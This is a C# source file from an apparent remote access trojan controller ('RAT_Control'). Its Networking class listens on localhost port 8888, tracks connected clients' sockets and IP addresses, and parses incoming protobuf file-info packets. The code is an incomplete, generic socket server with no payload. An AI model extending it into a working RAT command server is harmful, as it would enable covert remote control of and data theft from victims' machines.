using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net;
using System.Net.Sockets;
using System.Windows.Forms;
using Info;
using System.IO;
using Google.Protobuf;

#pragma warning disable 0618

namespace RAT_Control
{

    //list that adds packet info like myList.add(Name);
    public static class packGlobal
    {
        public static List<Socket> clientSockets = new List<Socket>();
        public static Info.Packet myPacket;
        public static Info.FileInfo myFile;
        public static string IP;
    }
    class Networking
    {
        private static byte[] buffer = new byte[1000000];
        int connectionNum = 0;
        const string DEFAULT_SERVER = "localhost";
        const int DEFAULT_PORT = 8888;

        //Server socket stuff 
        static System.Net.Sockets.Socket serverSocket;
        System.Net.Sockets.SocketInformation serverSocketInfo;

        //Client socket stuff 
        System.Net.Sockets.Socket clientSocket;
        //System.Net.Sockets.SocketInformation clientSocketInfo;

        public void Startup()
        {
            // The server always starts up on the localhost, using the default port 
            IPHostEntry hostInfo = Dns.GetHostByName(DEFAULT_SERVER);
            IPAddress serverAddr = hostInfo.AddressList[0];
            var serverEndPoint = new IPEndPoint(serverAddr, DEFAULT_PORT);

            // Create a listener socket and bind it to the endpoint 
            serverSocket = new System.Net.Sockets.Socket(System.Net.Sockets.AddressFamily.InterNetwork, System.Net.Sockets.SocketType.Stream, System.Net.Sockets.ProtocolType.Tcp);
            serverSocket.Bind(serverEndPoint);
            serverSocket.Listen(1);
            serverSocket.BeginAccept(new AsyncCallback(AcceptCallback), null);
        }

        private static void AcceptCallback(IAsyncResult AR)
        {
            Socket socket = serverSocket.EndAccept(AR);
            packGlobal.clientSockets.Add(socket);
            IPEndPoint remoteIPEndPoint = socket.RemoteEndPoint as IPEndPoint;
            packGlobal.IP = remoteIPEndPoint.Address.ToString();
            Console.WriteLine("Client Connected");
            socket.BeginReceive(buffer, 0, buffer.Length, SocketFlags.None, new AsyncCallback(ReceiveCallback), socket);
            serverSocket.BeginAccept(new AsyncCallback(AcceptCallback), null);
        }


        private static void ReceiveCallback(IAsyncResult AR)
        {
            Socket socket = (Socket)AR.AsyncState;
            int recv = socket.EndReceive(AR);
            byte[] dataBuf = new byte[recv];
            Array.Copy(buffer, dataBuf, recv);
            packGlobal.myFile = Info.FileInfo.Parser.ParseFrom(dataBuf);
           

        }



    }

}
            

          
            


          
  
